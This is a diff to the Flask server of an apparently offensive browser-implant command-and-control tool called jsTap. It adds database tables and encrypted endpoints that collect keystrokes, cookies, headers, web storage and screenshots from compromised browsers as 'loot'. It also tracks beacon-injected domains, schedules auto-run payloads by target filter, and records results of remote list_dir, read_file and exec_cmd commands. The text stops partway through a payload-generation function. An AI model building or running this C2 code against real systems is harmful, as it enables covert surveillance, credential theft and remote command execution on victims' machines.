@@ -5,22 +5,28 @@ from werkzeug.middleware.proxy_fix import ProxyFix
 from flask_cors import CORS
 from markupsafe import Markup, escape
 from flask_sqlalchemy import SQLAlchemy
-from sqlalchemy import DateTime, func, event, create_engine, orm, Column, Integer, String, DateTime, Text, Boolean, update
+from sqlalchemy import DateTime, func, event, create_engine, orm, Column, Integer, String, DateTime, Text, Boolean, update, UniqueConstraint, or_
 from sqlalchemy_utils import database_exists
 from sqlalchemy.engine import Engine
 from sqlalchemy.orm import scoped_session, sessionmaker, declarative_base
 from flask_login import LoginManager, login_user, logout_user, UserMixin, login_required, current_user
 from flask_bcrypt import Bcrypt
+from sqlalchemy.exc import IntegrityError
 from filelock import FileLock, Timeout
 from enum import Enum
 from user_agents import parse
 from email.mime.text import MIMEText
 from flask_executor import Executor
+from flask_sock import Sock
 from apscheduler.schedulers.background import BackgroundScheduler
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.serialization import load_der_public_key
+from cryptography.hazmat.primitives.asymmetric import padding as asymmetric_padding
+from cryptography.hazmat.primitives import hashes
 import magic
 import base64
 import json
+import re
 import uuid
 import os
 import time
@@ -127,6 +133,7 @@ logger.addHandler(fh)
 
 app = Flask(__name__)
 backgroundExecutor = Executor(app)
+sock = Sock(app)
 CORS(app)
 baseDir = os.path.abspath(os.path.dirname(__file__))
 
@@ -153,7 +160,7 @@ app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
 
 # Scoped Session Database setup
 database_uri = 'sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')
-engine       = create_engine(database_uri, connect_args={"check_same_thread": False, "timeout": 15})
+engine       = create_engine(database_uri, connect_args={"check_same_thread": False, "timeout": 60})
 db_session   = scoped_session(sessionmaker(autocommit=False, autoflush=False, bind=engine))
 Base         = declarative_base()
 Base.query   = db_session.query_property()
@@ -197,8 +204,28 @@ AdjectiveList = {
         "excited",
         "humorous",
         "charming",
-        "confident",
-        "fanatical"
+        "fanatical",
+        "grumpy",
+        "sneaky",
+        "rowdy",
+        "cheeky",
+        "jolly",
+        "dizzy",
+        "cranky",
+        "loopy",
+        "baffled",
+        "dramatic",
+        "feisty",
+        "savage",
+        "rabid",
+        "unhinged",
+        "feral",
+        "bonkers",
+        "maniacal",
+        "reckless",
+        "volatile",
+        "restless",
+        "legendary"
 }
 
 ColorList = {
@@ -222,7 +249,22 @@ ColorList = {
         "olive",
         "cyan",
         "ivory",
-        "magenta"
+        "magenta",
+        "teal",
+        "coral",
+        "scarlet",
+        "cobalt",
+        "amber",
+        "jade",
+        "copper",
+        "onyx",
+        "rust",
+        "indigo",
+        "charcoal",
+        "violet",
+        "khaki",
+        "slate",
+        "maroon"
 }
 
 
@@ -250,7 +292,23 @@ MurderCritter = {
         "echidna",
         "dugong",
         "sugarglider",
-        "blackswan"
+        "blackswan",
+        "huntsman",
+        "goanna",
+        "numbat",
+        "bilby",
+        "thornydevil",
+        "deathadder",
+        "irukandji",
+        "magpie",
+        "cockatoo",
+        "weta",
+        "bunyip",
+        "yowie",
+        "bluebottle",
+        "bandicoot",
+        "curlew",
+        "barramundi"
 }
 
 
@@ -266,6 +324,9 @@ class Client(Base):
     id              = Column(Integer, primary_key=True)
     nickname        = Column(String(100), unique=True, nullable=False)
     tag             = Column(String(40), unique=False, nullable=True)
+    clientType      = Column(String(20), nullable=False, default='js-implant')
+    parentUUID      = Column(String(100), nullable=True) # If spawned by a beacon
+    domain          = Column(String(255), nullable=True) # Primary domain for standard implants
     uuid            = Column(String(40), unique=True, nullable=False)
     fingerprint     = Column(String(20), nullable=True)
     sessionValid    = Column(Boolean, nullable=False, default=True)
@@ -281,6 +342,10 @@ class Client(Base):
     htmlCodeCounter = Column(Integer, server_default='1')
     receiveKey      = Column(String(44), nullable=True)
     sendKey         = Column(String(44), nullable=True)
+    cryptoActive    = Column(Boolean, nullable=False, default=False) # Client confirmed it can use keys (HTTPS)
+    sidecarSupported = Column(Boolean, nullable=False, default=False) # Sidecar support built into extension
+    sidecarConnected = Column(Boolean, nullable=False, default=False) # Sidecar native host currently connected
+    rawUserAgent    = Column(Text, nullable=True)
 
     def update(self):
         # logger.info("$$ Client Update func")
@@ -288,6 +353,48 @@ class Client(Base):
 
     def __repr__(self):
         return f'<Client {self.id}>'
+
+
+class BeaconDomain(Base):
+    __tablename__ = 'beacondomains'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    domain    = Column(String(255), nullable=False)
+    firstSeen = Column(DateTime(timezone=True), server_default=func.now())
+    lastSeen  = Column(DateTime(timezone=True), server_default=func.now())
+
+    __table_args__ = (UniqueConstraint('clientID', 'domain', name='_client_domain_uc'),)
+
+    def __repr__(self):
+        return f'<BeaconDomain {self.id}>'
+
+
+class BeaconVisit(Base):
+    __tablename__ = 'beaconvisits'
+
+    id        = Column(Integer, primary_key=True)
+    domainID  = Column(Integer, nullable=False)
+    url       = Column(Text, nullable=False)
+    visitTime = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<BeaconVisit {self.id}>'
+
+
+class BeaconCapture(Base):
+    __tablename__ = 'beaconcaptures'
+
+    id         = Column(Integer, primary_key=True)
+    domainID   = Column(Integer, nullable=False)
+    captureType = Column(String(50), nullable=False) # header, cookie, local_storage, session_storage
+    name       = Column(String(255), nullable=False)
+    value      = Column(Text, nullable=False)
+    extraData  = Column(Text, nullable=True)  # JSON for cookie flags, etc.
+    capturedAt = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<BeaconCapture {self.id}>'
 
 
 # Keep screenshots as files on disk, just track the filename
@@ -376,6 +483,15 @@ class SessionStorage(Base):
     key       = Column(Text, nullable=False)
     value     = Column(Text, nullable=False)
     timeStamp = Column(DateTime(timezone=True), server_default=func.now())
+
+class Keylog(Base):
+    __tablename__  = 'keylogs'
+    id             = Column(Integer, primary_key=True)
+    clientID       = Column(String(100), nullable=False)
+    keys           = Column(Text, nullable=False)
+    target         = Column(Text, nullable=True)
+    url            = Column(Text, nullable=True)
+    timeStamp      = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<SessionStorage {self.id}>'
@@ -495,6 +611,37 @@ class Event(Base):
         return f'<Event {self.id}>'
 
 
+class BeaconInjection(Base):
+    __tablename__ = 'beaconinjections'
+
+    id        = Column(Integer, primary_key=True)
+    beaconID  = Column(String(100), nullable=False) # Client UUID
+    domain    = Column(String(255), nullable=False)
+    tag       = Column(String(50), nullable=False)
+    active    = Column(Boolean, nullable=False, default=True)
+    last_success = Column(DateTime(timezone=True), nullable=True)
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<BeaconInjection {self.id}>'
+
+
+class SidecarResult(Base):
+    __tablename__ = 'sidecarresults'
+
+    id         = Column(Integer, primary_key=True)
+    clientID   = Column(String(100), nullable=False)  # beacon UUID
+    requestId  = Column(String(100), nullable=False)
+    command    = Column(String(50), nullable=False)    # list_dir, read_file, exec_cmd
+    success    = Column(Boolean, nullable=False)
+    data       = Column(Text, nullable=True)           # JSON string of result data
+    error      = Column(Text, nullable=True)
+    timeStamp  = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<SidecarResult {self.id}>'
+
+
 # Application settings
 class AppSettings(Base):
     __tablename__ = 'appsettings'
@@ -566,6 +713,20 @@ class ClientPayloadJob(Base):
 
 
 
+class PayloadTargetRule(Base):
+    __tablename__ = 'payloadtargetrules'
+
+    id          = Column(Integer, primary_key=True)
+    payloadKey  = Column(Integer, nullable=False)
+    filterQuery = Column(String(500), nullable=False)
+    active      = Column(Boolean, nullable=False, default=False)
+    repeatrun   = Column(Boolean, nullable=False, default=False)
+
+    def __repr__(self):
+        return f'<PayloadTargetRule {self.id}>'
+
+
+
 class BlockedIP(Base):
     __tablename__ = 'blockedips'
 
@@ -574,6 +735,37 @@ class BlockedIP(Base):
   
     def __repr__(self):
         return f'<BlockedIP {self.id}>'
+
+
+
+class PluginActivation(Base):
+    __tablename__ = 'pluginactivations'
+
+    id          = Column(Integer, primary_key=True)
+    clientID    = Column(String(100), nullable=False)
+    pluginId    = Column(String(100), nullable=False)
+    active      = Column(Boolean, default=True)
+    settings    = Column(Text, nullable=True)
+    activatedAt = Column(DateTime(timezone=True), server_default=func.now())
+    __table_args__ = (UniqueConstraint('clientID', 'pluginId'),)
+
+    def __repr__(self):
+        return f'<PluginActivation {self.id}>'
+
+
+
+class PluginData(Base):
+    __tablename__ = 'plugindata'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    pluginId  = Column(String(100), nullable=False)
+    dataType  = Column(String(100), nullable=False)
+    data      = Column(Text, nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<PluginData {self.id}>'
 
 
 
@@ -605,6 +797,38 @@ class User(UserMixin, Base):
 
 
 #***************************************************************************
+# Plugin System
+
+PLUGINS = {}  # pluginId -> {manifest, path, main.js, renderer.js, ui.html, ui.js}
+
+def loadPlugins():
+    pluginsDir = os.path.join(baseDir, 'plugins')
+    if not os.path.isdir(pluginsDir):
+        os.makedirs(pluginsDir, exist_ok=True)
+        return
+    for entry in os.listdir(pluginsDir):
+        pluginPath = os.path.join(pluginsDir, entry)
+        manifestPath = os.path.join(pluginPath, 'manifest.json')
+        if not (os.path.isdir(pluginPath) and os.path.isfile(manifestPath)):
+            continue
+        try:
+            with open(manifestPath, 'r') as f:
+                manifest = json.load(f)
+            plugin = {'manifest': manifest, 'path': pluginPath}
+            for fname in ['main.js', 'renderer.js', 'ui.html', 'ui.js']:
+                fpath = os.path.join(pluginPath, fname)
+                if os.path.isfile(fpath):
+                    with open(fpath, 'r') as f:
+                        plugin[fname] = f.read()
+                else:
+                    plugin[fname] = None
+            PLUGINS[manifest['id']] = plugin
+            logger.info(f"Loaded plugin: {manifest['id']} ({manifest.get('name', '')})")
+        except Exception as e:
+            logger.error(f"Failed to load plugin from {entry}: {e}")
+
+
+#***************************************************************************
 # Support Functions
 
 
@@ -632,22 +856,89 @@ def scheduleRepeatTasks(client):
     # get client scheduled payload
     clientPayloads = ClientPayloadJob.query.filter_by(clientKey=client.id)
 
+    # Build set of payload IDs already scheduled for this client
+    scheduledPayloadIds = set(cp.payloadKey for cp in clientPayloads)
 
     for payload in payloads:
-        alreadyScheduled = False
- 
-        for clientPayload in clientPayloads:
-            if clientPayload.payloadKey == payload.id:
-                # already scheduled!
-                alreadyScheduled = True
-                break
-        
-        if not alreadyScheduled:
-            newJob = ClientPayloadJob(clientKey=client.id, payloadKey = payload.id, code=payload.code, repeatrun=True)
+        if payload.id not in scheduledPayloadIds:
+            newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code, repeatrun=True)
             db_session.add(newJob)
-            # logger.info('********* Just added client update repeat job: ' + client.nickname + ', ' + str(payload.id))
+            scheduledPayloadIds.add(payload.id)
             dbCommit()
 
+    # Check target rules with repeat enabled
+    targetRules = PayloadTargetRule.query.filter_by(active=True, repeatrun=True).all()
+    for rule in targetRules:
+        if rule.payloadKey in scheduledPayloadIds:
+            continue
+        if clientMatchesFilter(client, rule.filterQuery):
+            payload = CustomPayload.query.filter_by(id=rule.payloadKey).first()
+            if payload:
+                newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code, repeatrun=True)
+                db_session.add(newJob)
+                scheduledPayloadIds.add(payload.id)
+                dbCommit()
+
+
+
+
+def clientMatchesFilter(client, filterQuery):
+    """Check if a client matches a filter query string.
+    Mirrors the JS filterClients() logic: split on &&, support ! negation,
+    case-insensitive substring match, all terms must pass (AND logic).
+    """
+    filterQuery = filterQuery.strip()
+    if not filterQuery:
+        return False
+
+    # Build haystack from client fields (mirrors JS filterClients)
+    display_domain = client.domain
+    if not display_domain and client.clientType != 'bex-beacon':
+        latest_url = UrlVisited.query.filter_by(clientID=client.uuid).order_by(UrlVisited.timeStamp.desc()).first()
+        if latest_url:
+            from urllib.parse import urlparse
+            parsed = urlparse(latest_url.url)
+            display_domain = parsed.hostname
+
+    haystack = ' '.join([
+        client.tag or '',
+        client.nickname or '',
+        client.ipAddress or '',
+        client.fingerprint or '',
+        client.platform or '',
+        client.browser or '',
+        client.clientType or '',
+        display_domain or '',
+        client.uuid or ''
+    ]).lower()
+
+    # Parse terms: split on &&, each can be negated with leading !
+    raw_terms = filterQuery.split('&&')
+    terms = []
+    for t in raw_terms:
+        t = t.strip().lower()
+        if not t:
+            continue
+        negate = False
+        if t.startswith('!'):
+            negate = True
+            t = t[1:].strip()
+        if t:
+            terms.append({'term': t, 'negate': negate})
+
+    if not terms:
+        return False
+
+    for term_obj in terms:
+        found = term_obj['term'] in haystack
+        if term_obj['negate']:
+            if found:
+                return False
+        else:
+            if not found:
+                return False
+
+    return True
 
 
 
@@ -818,22 +1109,36 @@ def eventNotificationEmail(identifier):
 
 
 
+# Extract the real client IP from proxy headers.
+# Priority: CF-Connecting-IP (Cloudflare) > first X-Forwarded-For entry > remote_addr
+def getClientIP():
+    if proxyMode:
+        # Cloudflare always sets this to the true client IP
+        cf_ip = request.headers.get('CF-Connecting-IP')
+        if cf_ip:
+            return cf_ip.strip()
+        # X-Forwarded-For is comma-separated: client, proxy1, proxy2, ...
+        xff = request.headers.get('X-Forwarded-For', '')
+        if xff:
+            return xff.split(',')[0].strip()
+    return request.remote_addr
+
+
 # Updates "last seen" timestamp"
 # Do not call db commit in here
 def clientSeen(identifier, ip, userAgent):
     # logger.info("!! Client seen: " + str(ip) + ', ' + userAgent)
     # logger.info("*** Starting clientSeen Update!")
 
-    parsedUserAgent = parse(userAgent)
-    # logger.info("--Browser: " + parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string)
-    # logger.info("--Platform: " + parsedUserAgent.os.family)
-
-
     # DB commit is handled by caller to clientSeen() method, don't do it here
     client = Client.query.filter_by(uuid=identifier).first()
     client.ipAddress = ip
-    client.platform  = parsedUserAgent.os.family
-    client.browser   = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string
+
+    if userAgent:
+        parsedUserAgent = parse(userAgent)
+        client.platform     = parsedUserAgent.os.family
+        client.browser      = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string
+        client.rawUserAgent = userAgent
 
     # update method touches the database lastseen timestamp
     client.update()
@@ -922,18 +1227,13 @@ def generateNickname():
     randomColor     = random.choice(list(ColorList))
     randomCritter   = random.choice(list(MurderCritter))
 
-    newNickname = randomAdjective + '-' + randomColor + '-' + randomCritter
+    baseNickname = randomAdjective + '-' + randomColor + '-' + randomCritter
+    newNickname  = baseNickname
 
     counter = 0
     while Client.query.filter_by(nickname=newNickname).count():
-        baseNickname = newNickname.replace('-'+ str(counter), '')
-        # logger.info("Base nickname created: " + baseNickname)
         counter += 1
-
-
         newNickname = baseNickname + '-' + str(counter)
-        # logger.info("Still looping for name, counter: " + str(counter))
-        # logger.info("Current newNickname: " + newNickname)
 
     return newNickname
 
@@ -1015,6 +1315,12 @@ try:
                     FormPost.__table__.drop(engine)
                     CustomExfil.__table__.drop(engine)
                     ClientPayloadJob.__table__.drop(engine)
+                    BeaconDomain.__table__.drop(engine)
+                    BeaconVisit.__table__.drop(engine)
+                    BeaconCapture.__table__.drop(engine)
+                    BeaconInjection.__table__.drop(engine)
+                    PluginActivation.__table__.drop(engine)
+                    PluginData.__table__.drop(engine)
                     db_session.execute(update(AppSettings).where(AppSettings.id==1).values(emailContent="", lastEmailSent=None))
                     dbCommit()
 
@@ -1049,15 +1355,20 @@ try:
     if not os.path.exists(dataDirectory + "lootFiles"):
         os.mkdir(dataDirectory + "lootFiles")
 
+    # Load plugins
+    loadPlugins()
 
     # Set our journaling mode to wright ahead log
     @event.listens_for(Engine, "connect")
     def set_sqlite_pragma(dbapi_connection, connection_record):
-        cursor = dbapi_connection.cursor()
-        cursor.execute("PRAGMA journal_mode=WAL;")
-        cursor.execute("PRAGMA synchronous=normal;")
-        cursor.execute("PRAGMA cache_size = -20971520;") # 20MB
-        cursor.close()
+        try:
+            cursor = dbapi_connection.cursor()
+            cursor.execute("PRAGMA journal_mode=WAL;")
+            cursor.execute("PRAGMA synchronous=normal;")
+            cursor.execute("PRAGMA cache_size = -20971520;") # 20MB
+            cursor.close()
+        except Exception as e:
+            logger.error(f"Error setting SQLite PRAGMAs: {e}")
 
 
     # Start our background notification email checker
@@ -1159,7 +1470,10 @@ def sendLootFile(path):
 @app.route('/protectedStatic/<path:path>')
 @login_required
 def sendProtectedStaticFile(path):
-    return send_from_directory('protectedStatic', path)
+    response = send_from_directory('protectedStatic', path)
+    if path.endswith('.js') or path.endswith('.css'):
+        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    return response
 
 
 
@@ -1222,8 +1536,12 @@ def logout():
 # Get UUID for client token
 @app.route('/client/getToken', methods=['GET'])
 @app.route('/client/getToken/<tag>', methods=['GET'])
-def returnUUID(tag=''):
-    # Check to see if we're still allowing new client connections
+@app.route('/client/getToken/<tag>/<clientType>', methods=['GET'])
+def returnUUID(tag='', clientType='js-implant'):
+    # Check for parent link if spawned from a beacon
+    parentUUID = request.args.get('parent')
+
+    # Check to see if we're still allowing new sessions
     appSettings = AppSettings.query.filter_by(id=1).first()
 
     # logger.info("In UUID, app setting is: " + str(appSettings.allowNewSessions))
@@ -1231,10 +1549,7 @@ def returnUUID(tag=''):
         return "No.", 401
 
     # Is this IP blocked?
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
  
     blockedIP = BlockedIP.query.filter_by(ip=ip).first()
     if blockedIP is not None:
@@ -1245,12 +1560,18 @@ def returnUUID(tag=''):
     # setup a new client
     token = str(uuid.uuid4())
 
-    logger.info("New session for client: " + token)
+    logger.info("New session for client: " + token + " (" + clientType + ")")
+
+    # Capture User-Agent
+    userAgent = request.headers.get('User-Agent')
+    parsedUserAgent = parse(userAgent)
+    platform  = parsedUserAgent.os.family
+    browser   = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string
 
 
     # Database Entry
     newNickname = generateNickname()
-    newClient   = Client(uuid=str(token), nickname=newNickname, tag=tag, notes="", receiveKey=None, sendKey=None)
+    newClient   = Client(uuid=str(token), parentUUID=parentUUID, nickname=newNickname, tag=tag, clientType=clientType, ipAddress=ip, platform=platform, browser=browser, rawUserAgent=userAgent, notes="", receiveKey=None, sendKey=None)
     db_session.add(newClient)
     db_session.commit()
 
@@ -1271,9 +1592,23 @@ def returnUUID(tag=''):
     payloads = CustomPayload.query.filter_by(autorun=True)
     client   = Client.query.filter_by(uuid=token).first()
 
+    scheduledPayloadIds = set()
     for payload in payloads:
         newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
         db_session.add(newJob)
+        scheduledPayloadIds.add(payload.id)
+
+    # Add target rule repeat payloads for this new client
+    targetRules = PayloadTargetRule.query.filter_by(active=True, repeatrun=True).all()
+    for rule in targetRules:
+        if rule.payloadKey in scheduledPayloadIds:
+            continue
+        if clientMatchesFilter(client, rule.filterQuery):
+            payload = CustomPayload.query.filter_by(id=rule.payloadKey).first()
+            if payload:
+                newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code, repeatrun=True)
+                db_session.add(newJob)
+                scheduledPayloadIds.add(payload.id)
 
     dbCommit()
 
@@ -1287,48 +1622,56 @@ def returnUUID(tag=''):
 
 
 
-# Check if we're using traffic obfuscation
-# and if we are return IV and key
-@app.route('/client/metricSettings/<identifier>', methods=['GET'])
-def getObfuscationSettings(identifier):
+# RSA-OAEP key exchange: client sends its public key,
+# server encrypts AES keys with it and returns the ciphertext
+@app.route('/client/keyExchange/<identifier>', methods=['POST'])
+def keyExchange(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
     appSettings = AppSettings.query.filter_by(id=1).first()
+    client = Client.query.filter_by(uuid=identifier).first()
 
     encryptionData = {}
 
-    if appSettings.obfuscateTraffic:
-        client = Client.query.filter_by(uuid=identifier).first()
+    if appSettings.obfuscateTraffic or (client and client.clientType in ('bex-beacon', 'atom-beacon', 'v8-beacon')):
+        # Generate AES keys if they don't exist yet for this session
+        if client.receiveKey is None or client.sendKey is None:
+            receiveKey = os.urandom(32)
+            sendKey    = os.urandom(32)
 
-        receiveKey = os.urandom(32)
-        sendKey    = os.urandom(32)
+            client.receiveKey = receiveKey
+            client.sendKey    = sendKey
 
-        client.receiveKey = receiveKey
-        client.sendKey    = sendKey
+            db_session.add(client)
+            dbCommit()
+        else:
+            receiveKey = client.receiveKey
+            sendKey    = client.sendKey
 
-        db_session.add(client)
-        dbCommit()
+        # Parse the client's RSA public key from the request
+        content = request.json
+        clientPubKeyDer = base64.b64decode(content['publicKey'])
+        clientPublicKey = load_der_public_key(clientPubKeyDer)
 
-        # Get rid of dashes in UUID session identifier
-        identifierBytes = bytes.fromhex(identifier.replace('-', ''))
+        # Encrypt receiveKey + sendKey (64 bytes) with RSA-OAEP
+        # Client assigns: first 32 bytes = its sendKey, next 32 = its receiveKey
+        # So: client encrypts with receiveKey (server decrypts with client.receiveKey) ✓
+        #     server encrypts with sendKey (client decrypts with client.sendKey) ✓
+        plaintextKeys = receiveKey + sendKey
+        encryptedKeys = clientPublicKey.encrypt(
+            plaintextKeys,
+            asymmetric_padding.OAEP(
+                mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
 
-        # rotate the UUID for some light obfuscation
-        shift        = 7 % len(identifierBytes)
-        rotatedBytes = identifierBytes[shift:] + identifierBytes[:shift]
-
-        #xor up
-        plaintextData = sendKey + receiveKey
-
-        maskRepeated = (rotatedBytes * ((len(plaintextData) // len(rotatedBytes)) + 1))[:len(plaintextData)]
-        obfuscatedData = bytes(a ^ b for a, b in zip(plaintextData, maskRepeated))
-
-        encryptionData["enable"]      = "true"
-        encryptionData["metricDebug"] = base64.b64encode(obfuscatedData).decode("utf-8")
+        encryptionData["enable"]        = "true"
+        encryptionData["encryptedKeys"] = base64.b64encode(encryptedKeys).decode("utf-8")
     else:
-        encryptionData["enable"]      = "false"
-        encryptionData["metricDebug"] = ""
-
+        encryptionData["enable"] = "false"
 
     return jsonify(encryptionData)
 
@@ -1342,10 +1685,7 @@ def receiveEncryptedMessage(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     userAgent = request.headers.get('User-Agent')
    
@@ -1366,8 +1706,18 @@ def receiveEncryptedMessage(identifier):
     client = Client.query.filter_by(uuid=identifier).first()
     aesgcm = AESGCM(client.receiveKey)
 
-    path    = aesgcm.decrypt(iv, pathCipherText, None)
-    message = aesgcm.decrypt(iv, messageCipherText, None)
+    try:
+        path    = aesgcm.decrypt(iv, pathCipherText, None)
+        message = aesgcm.decrypt(iv, messageCipherText, None)
+        
+        # If we successfully decrypted, this client is definitely crypto-capable
+        if client and not client.cryptoActive:
+            client.cryptoActive = True
+            dbCommit()
+            logger.info(f"Client {identifier} automatically confirmed crypto-active via successful decryption.")
+    except Exception as e:
+        logger.error(f"Failed to decrypt message for {identifier}: {e}")
+        return "No.", 400
 
     if path.decode('utf-8') == "/client/fingerprint":
         logger.info("Received encrypted fingerprint message")
@@ -1412,6 +1762,12 @@ def receiveEncryptedMessage(identifier):
         sessionStorageValue = jsonData['value']
         saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, userAgent)
 
+    elif path.decode('utf-8') == "/loot/keylog":
+        logger.info("Received encrypted keylog message")
+        jsonData = json.loads(message.decode('utf-8'))
+        saveKeylog(identifier, jsonData.get('keys', ''), jsonData.get('target', ''),
+                   jsonData.get('url', ''), ip, userAgent)
+
     elif path.decode('utf-8') == "/loot/xhrRequest":
         logger.info("Received encrypted xhrRequest message")
         jsonData = json.loads(message.decode('utf-8'))
@@ -1434,40 +1790,115 @@ def receiveEncryptedMessage(identifier):
         data     = jsonData['data']
         saveCustomExfil(identifier, note, data, ip, userAgent)
 
+    elif path.decode('utf-8').startswith("/plugin/data/"):
+        pluginId = path.decode('utf-8').split('/')[3]
+        logger.info(f"Received encrypted plugin data for plugin: {pluginId}")
+        jsonData = json.loads(message.decode('utf-8'))
+        dataType = jsonData.get('dataType', 'generic')
+        newData = PluginData(clientID=identifier, pluginId=pluginId,
+                             dataType=dataType, data=json.dumps(jsonData.get('data', {})))
+        db_session.add(newData)
+        clientSeen(identifier, ip, userAgent)
+        dbCommit()
+        db_session.refresh(newData)
+        db_session.add(Event(clientID=identifier, timeStamp=newData.timeStamp,
+                             eventType='PLUGIN', eventID=newData.id))
+        dbCommit()
+
+    elif path.decode('utf-8') == "/bex/report":
+        logger.info("Received encrypted BEX report message")
+        jsonData = json.loads(message.decode('utf-8'))
+        # jsonData can contain a list of objects now: [{domain: '...', url: '...'}]
+        # Backward compatibility check if it's just domains (though we control the client)
+        
+        items = jsonData.get('visits', [])
+        # If 'visits' is empty, maybe it's the old format with 'domains' (just in case)
+        if not items:
+             old_domains = jsonData.get('domains', [])
+             for d in old_domains:
+                 saveBeaconVisit(identifier, d, None, ip, userAgent)
+        else:
+            for item in items:
+                domain = item.get('domain')
+                url    = item.get('url')
+                saveBeaconVisit(identifier, domain, url, ip, userAgent)
+
+    elif path.decode('utf-8') == "/bex/capture":
+        logger.info("Received encrypted BEX capture message")
+        jsonData = json.loads(message.decode('utf-8'))
+        domain      = jsonData.get('domain')
+        captureType = jsonData.get('type')
+        name        = jsonData.get('name')
+        value       = jsonData.get('value')
+        url         = jsonData.get('url') # Optional URL
+        extraData   = jsonData.get('metadata') # Optional JSON metadata (cookie flags, etc.)
+        saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgent, url, extraData)
+
+    elif path.decode('utf-8') == "/bex/injection_success":
+        logger.info("Received BEX injection success report")
+        jsonData = json.loads(message.decode('utf-8'))
+        domain = jsonData.get('domain')
+        if domain:
+            injection = BeaconInjection.query.filter_by(beaconID=identifier, domain=domain, active=True).first()
+            if injection:
+                injection.last_success = func.now()
+                dbCommit()
+                logger.info(f"BEX: Injection success recorded for {domain} via beacon {identifier}")
+
+    elif path.decode('utf-8').startswith("/bex/screenshot/"):
+        targetUUID = path.decode('utf-8').replace("/bex/screenshot/", "")
+        logger.info(f"Received proxied BEX screenshot for {targetUUID}")
+        saveScreenshot(targetUUID, message, ip, userAgent)
+
     elif path.decode('utf-8') == "/loot/screenshot":
         logger.info("Received encrypted screenshot message")
-
-        file_type = magic.from_buffer(message, mime=True)
-
-        if file_type != 'image/png':
-            logger.error("!!!! Wrong screenshot filetype!")
-            logger.error("---- Type: " + file_type)
-            return "No.", 401
-
-        lootDir = findLootDirectory(identifier)
-
-        client_data = Client.query.with_entities(Client.imageCounter).filter_by(uuid=identifier).first()
-        imageNumber = client_data[0]
-        file_path = os.path.join(dataDirectory, "lootFiles", lootDir, f"{imageNumber}_Screenshot.png")
- 
-        with open(file_path, "wb") as binary_file:
-            binary_file.write(message)
-        # Record the screenshot event in the DB.
-        newScreenshot = Screenshot(clientID=identifier, fileName="./lootFiles/" + lootDir + "/" + f"{imageNumber}_Screenshot.png")
-        db_session.add(newScreenshot)
-        db_session.execute(update(Client).where(Client.uuid == identifier).values(imageCounter=Client.imageCounter+1))
-        dbCommit()
-
-        db_session.refresh(newScreenshot)
-        newEvent = Event(clientID=identifier, timeStamp=newScreenshot.timeStamp, 
-            eventType='SCREENSHOT', eventID=newScreenshot.id)
-        db_session.add(newEvent)
-        dbCommit()
+        saveScreenshot(identifier, message, ip, userAgent)
 
     elif path.decode('utf-8') == "/client/taskCheck":
         logger.info("Received encrypted task check request message")
         return createTaskResponse(identifier)
 
+    elif path.decode('utf-8') == "/beacon/status":
+        logger.info("Received beacon status update")
+        jsonData = json.loads(message.decode('utf-8'))
+        client = Client.query.filter_by(uuid=identifier).first()
+        if client:
+            client.sidecarSupported = jsonData.get('supported', False)
+            # Atom-beacon and v8-beacon have built-in capabilities — treat as always connected
+            if client.clientType in ('atom-beacon', 'v8-beacon'):
+                client.sidecarConnected = client.sidecarSupported
+            elif 'connected' in jsonData:
+                client.sidecarConnected = jsonData.get('connected', False)
+            # For v8-beacon, show Node version instead of "Other" browser
+            if client.clientType == 'v8-beacon' and jsonData.get('nodeVersion'):
+                client.browser = 'Node ' + jsonData['nodeVersion']
+                client.platform = jsonData.get('platform', client.platform or '')
+            client.lastSeen = datetime.datetime.now(datetime.timezone.utc)
+            dbCommit()
+
+    elif path.decode('utf-8') == "/bex/sidecar/status":
+        logger.info("Received sidecar status update")
+        jsonData = json.loads(message.decode('utf-8'))
+        client = Client.query.filter_by(uuid=identifier).first()
+        if client:
+            client.sidecarSupported = jsonData.get('supported', False)
+            if 'connected' in jsonData:
+                client.sidecarConnected = jsonData.get('connected', False)
+            dbCommit()
+
+    elif path.decode('utf-8') == "/bex/sidecar/result":
+        logger.info("Received sidecar command result")
+        jsonData = json.loads(message.decode('utf-8'))
+        newResult = SidecarResult(
+            clientID=identifier,
+            requestId=jsonData.get('requestId', ''),
+            command=jsonData.get('command', ''),
+            success=jsonData.get('success', False),
+            data=json.dumps(jsonData.get('data')) if jsonData.get('data') else None,
+            error=jsonData.get('error')
+        )
+        db_session.add(newResult)
+        dbCommit()
 
     else:
         logger.error("Invalid path in receiveEncryptedMessage")
@@ -1511,6 +1942,653 @@ def setFingerprint(identifier):
     return "ok", 200
 
 
+def generate_injection_payload(tag, server_url):
+    with open('telemlib.js', 'r') as file:
